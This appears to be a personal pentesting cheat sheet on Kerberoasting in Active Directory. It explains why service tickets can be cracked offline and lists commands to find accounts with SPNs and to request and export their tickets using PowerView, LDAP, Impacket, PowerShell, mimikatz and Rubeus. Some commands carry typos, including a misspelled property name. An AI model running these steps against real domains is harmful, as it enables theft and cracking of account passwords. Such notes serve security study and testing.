- ST can be requested by any user for any service if it's [[Active Directory/AD Concepts/Services#SPN|SPN]] is registered in the domain.
- STs are encrypted with the service account which runs the service.
- Hence, we can try to crack the password of the service user account.
- In case of managed service accounts, the password is of 120 characters and changes every month, hence it is not possible to crack their password.
- However, some services are run with normal user accounts, managed by people, that can have weak password.
- Kerberoast involves service running under regular user accounts. We can request STs for the services and crack password locally.
We can query for users with SPNs using
- Powerview
```powershell
Get-NetUser -SPN
```
- LDAP
```ladp
(&(samAccountType=805306368)(servicePrincipalName=*))
```
- AD-RSAT (Active Directory module)
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrinicipalName
```
### Requesting TGS
- Impacket's `GetUserSPNs.py` script can be used to query users with SPN and request STs for the service.
```bash
# This will search for SPNs, request STs for the same using supplied credentials and same the STs in "kerberoast.hash"
python GetUserSPNs.py mydomain.local/a.drdragon:Password!! -dc-ip <ip> -outputfile kerberoast.hash
```
- Requesting a TGS using powrshell
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQL/mssqldomain.mydomain.local"
# This will add the kerberos key in memeory, and can be verified with klist
klist
# The key can be extracted with mimikatz
kerberos::list /export
```
- Powerview
```powershell
Request-SPNTicket
```
- Rubeus
```powershell
.\Rubeus kerberoast /nowrap
```